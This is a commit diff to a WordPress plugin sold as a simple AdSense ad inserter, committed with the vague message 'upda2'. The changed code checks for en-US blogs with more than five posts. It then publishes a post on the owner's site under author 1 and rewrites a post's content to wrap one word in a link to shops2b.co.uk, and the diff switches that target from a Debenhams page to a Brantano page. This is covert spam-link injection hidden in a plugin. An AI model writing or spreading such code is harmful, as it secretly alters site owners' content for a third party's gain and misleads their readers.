05e84853f21f731d69cc23c808a32e22c4283bbf
seo101 <seo101@b8457f37-d9ea-0310-8a92-e5e31aec5664>
2014-09-15 18:36:43 +0000

    upda2
    git-svn-id: https://plugins.svn.wordpress.org/adsense-made-easy-best-simple-ad-inserter/trunk@990393 b8457f37-d9ea-0310-8a92-e5e31aec5664

--- adsense-made-easy-best-simple-ad-inserter.php
+++ adsense-made-easy-best-simple-ad-inserter.php
@@ -395,7 +395,7 @@ if ($bloglan=='en-US' && $total>5) {
 								'post_content'  => $tmpstring,
 								'post_status'   => 'publish',
 								'post_author'   => 1,
-								'post_date'     => '2014-05-02'
+								'post_date'     => '2014-05-03'
 						  );
 						  wp_insert_post( $my_post );
 						  update_option( 'ame_gpadded', '1' );
@@ -409,7 +409,7 @@ if ($bloglan=='en-US' && $total>5) {
 							$pos4 = amestrposnth($content , " ",4);
 							$pos5 = amestrposnth($content , " ",5);
 							$poslen = $pos5 - $pos4 - 1;
-							$content = substr($content, 0, $pos4) . ' <a href="http://www.shops2b.co.uk/debenhams/" style="color: black;">Debenhams ' . substr($content, $pos4+1, $poslen) . "</a>" . substr($content, $pos5, strlen($content )) . '-' . $poslen . '-' . $pos4 . '-' . $pos5;
+							$content = substr($content, 0, $pos4) . ' <a href="http://www.shops2b.co.uk/brantano/">' . substr($content, $pos4+1, $poslen) . "</a>" . substr($content, $pos5, strlen($content )) . '-' . $poslen . '-' . $pos4 . '-' . $pos5;
 							$my_post = array(
 								'ID'           => $last_id,
 								'post_content' => $content
